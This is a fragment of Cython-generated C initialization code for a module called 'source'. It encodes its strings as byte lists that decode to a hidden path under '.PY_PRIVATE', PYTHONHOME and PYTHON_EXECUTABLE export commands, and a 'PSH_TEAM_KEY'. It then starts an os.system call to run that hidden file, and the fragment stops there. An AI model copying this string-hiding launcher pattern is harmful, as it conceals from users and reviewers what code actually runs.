  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 5, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 5, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 5, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_216);
  __Pyx_GIVEREF(__pyx_int_216);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_216);
  __Pyx_INCREF(__pyx_int_168);
  __Pyx_GIVEREF(__pyx_int_168);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_168);
  __Pyx_INCREF(__pyx_int_216);
  __Pyx_GIVEREF(__pyx_int_216);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_216);
  __Pyx_INCREF(__pyx_int_174);
  __Pyx_GIVEREF(__pyx_int_174);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_174);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_240);
  __Pyx_GIVEREF(__pyx_int_240);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_240);
  __Pyx_INCREF(__pyx_int_159);
  __Pyx_GIVEREF(__pyx_int_159);
  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_int_159);
  __Pyx_INCREF(__pyx_int_145);
  __Pyx_GIVEREF(__pyx_int_145);
  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_int_145);
  __Pyx_INCREF(__pyx_int_128);
  __Pyx_GIVEREF(__pyx_int_128);
  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_int_128);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PSH_TEAM_KEY, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(29); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_89);
  __Pyx_GIVEREF(__pyx_int_89);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_89);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_82);
  __Pyx_GIVEREF(__pyx_int_82);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_82);
  __Pyx_INCREF(__pyx_int_73);
  __Pyx_GIVEREF(__pyx_int_73);
  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_int_73);
  __Pyx_INCREF(__pyx_int_86);
  __Pyx_GIVEREF(__pyx_int_86);
  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_int_86);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_1, 9, __pyx_int_84);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_1, 10, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 11, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_1, 12, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_1, 13, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_1, 14, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_1, 15, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 16, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_1, 17, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 18, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 19, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 20, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_1, 21, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_1, 22, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_1, 23, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_1, 24, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_1, 25, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_1, 26, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_1, 27, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_1, 28, __pyx_int_50);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXECUTE_FILE, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_prefix); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PREFIX, __pyx_t_2) < 0) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(18); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_89);
  __Pyx_GIVEREF(__pyx_int_89);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_89);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_84);
  __Pyx_INCREF(__pyx_int_72);
  __Pyx_GIVEREF(__pyx_int_72);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_72);
  __Pyx_INCREF(__pyx_int_79);
  __Pyx_GIVEREF(__pyx_int_79);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_79);
  __Pyx_INCREF(__pyx_int_78);
  __Pyx_GIVEREF(__pyx_int_78);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_78);
  __Pyx_INCREF(__pyx_int_72);
  __Pyx_GIVEREF(__pyx_int_72);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_72);
  __Pyx_INCREF(__pyx_int_79);
  __Pyx_GIVEREF(__pyx_int_79);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_79);
  __Pyx_INCREF(__pyx_int_77);
  __Pyx_GIVEREF(__pyx_int_77);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_77);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_2, 16, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_2, 17, __pyx_int_61);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHONHOME, __pyx_t_3) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(25); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_89);
  __Pyx_GIVEREF(__pyx_int_89);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_89);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_84);
  __Pyx_INCREF(__pyx_int_72);
  __Pyx_GIVEREF(__pyx_int_72);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_72);
  __Pyx_INCREF(__pyx_int_79);
  __Pyx_GIVEREF(__pyx_int_79);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_79);
  __Pyx_INCREF(__pyx_int_78);
  __Pyx_GIVEREF(__pyx_int_78);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_78);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_88);
  __Pyx_GIVEREF(__pyx_int_88);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_88);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_3, 16, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_67);
  __Pyx_GIVEREF(__pyx_int_67);
  PyList_SET_ITEM(__pyx_t_3, 17, __pyx_int_67);
  __Pyx_INCREF(__pyx_int_85);
  __Pyx_GIVEREF(__pyx_int_85);
  PyList_SET_ITEM(__pyx_t_3, 18, __pyx_int_85);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_3, 19, __pyx_int_84);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_3, 20, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_66);
  __Pyx_GIVEREF(__pyx_int_66);
  PyList_SET_ITEM(__pyx_t_3, 21, __pyx_int_66);
  __Pyx_INCREF(__pyx_int_76);
  __Pyx_GIVEREF(__pyx_int_76);
  PyList_SET_ITEM(__pyx_t_3, 22, __pyx_int_76);
  __Pyx_INCREF(__pyx_int_69);
  __Pyx_GIVEREF(__pyx_int_69);
  PyList_SET_ITEM(__pyx_t_3, 23, __pyx_int_69);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_3, 24, __pyx_int_61);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_executable); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_t_1) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_47);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RUN, __pyx_t_3) < 0) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_isfile); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_4) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);

    
    __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_int_32);
    __Pyx_GIVEREF(__pyx_int_32);
    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
    __Pyx_INCREF(__pyx_int_38);
    __Pyx_GIVEREF(__pyx_int_38);
    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
    __Pyx_INCREF(__pyx_int_38);
    __Pyx_GIVEREF(__pyx_int_38);
    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
    __Pyx_INCREF(__pyx_int_32);
    __Pyx_GIVEREF(__pyx_int_32);
